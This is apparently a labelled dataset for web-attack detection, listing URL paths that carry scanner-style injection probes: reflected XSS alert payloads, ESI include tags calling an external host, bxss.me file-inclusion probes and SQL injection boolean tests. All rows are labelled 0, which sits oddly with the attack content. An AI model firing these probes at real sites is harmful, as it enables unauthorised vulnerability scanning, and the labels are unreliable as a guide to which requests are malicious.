sentences	labels
/qtyz&mswpmm&common&signin.aspx?tbemailaddress=alert(777)returnurl=/******/common/default.aspx 	 0
/ldzc&bysrd&202005&t20200511_163094.html?leader=ºÎ¼ÌÏÈ<esi:include src=""http://*******/rpb.png""/> 	 0
/cgi-bin&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/***/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 0
/ru&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/***/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 0
/jsearchfront&search.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=1&q=ÇëÊäÈë¹Ø¼ü´Ê&searchid=1&tpl=16<esi:include src=""http://*******/rpb.png""/>&websiteid=110105008056111 	 0
/lz&system&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/xwzx&mtll&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ztzl&gjdjbn&djbn_gjjs&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/jsearchfront&template&jcse&http:&&bxss.me&t&fit.txt?.jpg/**/images/plugin/mainframe/spellcheck.js 	 0
/ldzc&bysw&swsj&201610&t20161010_456.html?leader=ËÕ¾ý<esi:include src=""http://*******/rpb.png""/> 	 0
/ldzc&bysrd&201611&t20161129_78963.html?leader=ÎÂÐñ¶«<esi:include src=""http://*******/rpb.png""/> 	 0
/jsearchfront&http:&&bxss.me&t&fit.txt?.jpg/****/110105008056111/16/images/main.css 	 0
/images&dependencies&index?search="">alert(/***/) 	 0
/ywzzq&api&sources?resource=alert(/***/)&format=txt 	 0
/xwzx&&screens&switch&switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/******/logo-mobility-controller.gif onload=alert(777)> 	 0
/xxgk&zzxxgk&tjj&zfxxgkzn_2123&list.html?new=bxss.me/*/xss.html? 	 0
/xq&mswpmm&common&signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 0
/dcwj&&screens&switch&switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/******/logo-mobility-controller.gif onload=alert(777)> 	 0
/xwzx&tzgg&tz17_6387&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/video&&screens&switch&switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/******/logo-mobility-controller.gif onload=alert(777)> 	 0
/microstrategy7&login.asp?server=server001&project=project001&port=0&uid=uid001&msg="><script>alert(/***************************/);</script>< 	 0
/jsearchfront&categorysearch.do?cateid=1&eq=1&oq=bxss.me/*/xss.html? 	 0
/en&mswpmm&common&signin.aspx?btnsignin=alert(777)returnurl=/******/common/default.aspx 	 0
/z&fupin&index&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/public&wp-admin&admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> 	 0
/xxgk&rsxcsx&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/igi&nbhd&opengovmsgbox.do?appid=4&method=listgovmsgboxs&pagesize=5&siteid=115<esi:include src=""http://*******/rpb.png""/> 	 0
/ldzc&byszf&202007&t20200701_168748.html?leader=Ðì¡¡·å<esi:include src=""http://*******/rpb.png""/> 	 0
/ztpd&system&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/nul&&screens&switch&switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/******/logo-mobility-controller.gif onload=alert(777)> 	 0
/gygj&ssgs&lkgx&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/shzr&zrbg&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/qywh&shzr&xfgj&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/zwgk&czgk&http:&&bxss.me&t&fit.txt?.jpg/****/ 	 0
/xxgk&xxgknb&2009&list.html?new=0.23190916418329843<esi:include src=""http://*******/rpb.png""/> 	 0
/jsearchfront&categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=bxss.me/*/xss.html? 	 0
/xq&system&count&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/pdfreader&web&viewer.html?file=/*********/gqtb/2019063pdf') and 6656=6656 and ('owpf'='owpf 	 0
/nbfw&mswpmm&common&signin.aspx?btnsignin=alert(777)returnurl=/******/common/default.aspx 	 0
/ywly&gccb&wjwszzgc&images&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/pdfreader&web&viewer.html?file=/*********/gqtb/2019063pdf and 6656=6656 	 0
/xq&system&2021&08&19&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ywzzq&&screens&switch&switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/******/logo-mobility-controller.gif onload=alert(777)> 	 0
/con&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/***/)&false_positives=without&sort=&asc=false&commit=search 	 0
/con&&screens&switch&switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/******/logo-mobility-controller.gif onload=alert(777)> 	 0
